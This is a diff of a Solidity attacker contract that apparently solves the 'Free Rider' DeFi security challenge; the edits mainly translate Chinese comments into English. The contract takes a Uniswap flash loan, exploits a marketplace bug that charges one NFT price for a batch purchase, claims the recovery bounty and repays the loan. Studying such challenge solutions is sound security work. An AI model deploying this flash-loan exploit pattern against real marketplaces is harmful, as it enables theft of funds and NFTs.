@@ -17,8 +17,8 @@ contract FreeRiderAttacker is IERC721Receiver {
     uint256 private constant NFT_PRICE = 15 ether;
     
     constructor(
-        address payable _weth,      // 修改为address payable
-        address payable _marketplace, // 修改为address payable
+        address payable _weth,      
+        address payable _marketplace, 
         address _nft,
         address _recoveryManager,
         address _player,
@@ -33,54 +33,50 @@ contract FreeRiderAttacker is IERC721Receiver {
     }
     
     function attack() external {
-        // 使用Uniswap闪电贷借15 ETH
+        // Use Uniswap for flashLoan 15 ETH
         bytes memory data = abi.encode("flashLoan");
         uniswapPair.swap(
-            NFT_PRICE, // 借WETH
-            0,         // 不借另一个代币
+            NFT_PRICE,
+            0,
             address(this),
             data
         );
     }
-    
-    // Uniswap闪电贷回调函数
+
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
         require(msg.sender == address(uniswapPair), "Not uniswapPair");
         require(sender == address(this), "Not this contract");
         
-        // 将WETH转换为ETH
+        // Exchange WETH to ETH
         weth.withdraw(NFT_PRICE);
         
-        // 准备购买所有NFT
+        // buy all the NFT with only once payment of 15 ETH
         uint256[] memory tokenIds = new uint256[](6);
         for(uint i = 0; i < 6; i++) {
             tokenIds[i] = i;
         }
         
-        // 购买所有NFT，由于漏洞，只需要支付一次15 ETH
         marketplace.buyMany{value: NFT_PRICE}(tokenIds);
         
-        // 将所有NFT转给恢复管理者以获得赏金
+        // Trasfer NFT to recoveryManager
         for(uint i = 0; i < 6; i++) {
             // 添加player作为回调数据，这样recovery manager可以知道谁救了NFTs
             nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player));
         }
         
-        // 计算需要归还的金额（带有0.3%的手续费）
+        // Calculate the fee need to repay (extra 0.3%)
         uint256 fee = ((NFT_PRICE * 3) / 997) + 1;
         uint256 amountToRepay = NFT_PRICE + fee;
         
-        // 将获得的ETH转换为WETH以归还闪电贷
+        // Exchange ETH to WETH
         weth.deposit{value: amountToRepay}();
         
-        // 归还闪电贷
         weth.transfer(address(uniswapPair), amountToRepay);
         
-        // 将剩余的ETH转给player
+        // Trasfer ETH to player
         payable(player).transfer(address(this).balance);
     }
     
-    // 实现接收NFT的功能
     function onERC721Received(
         address,
         address,
@@ -90,6 +86,5 @@ contract FreeRiderAttacker is IERC721Receiver {
         return this.onERC721Received.selector;
     }
     
-    // 接收ETH
     receive() external payable {}
 }
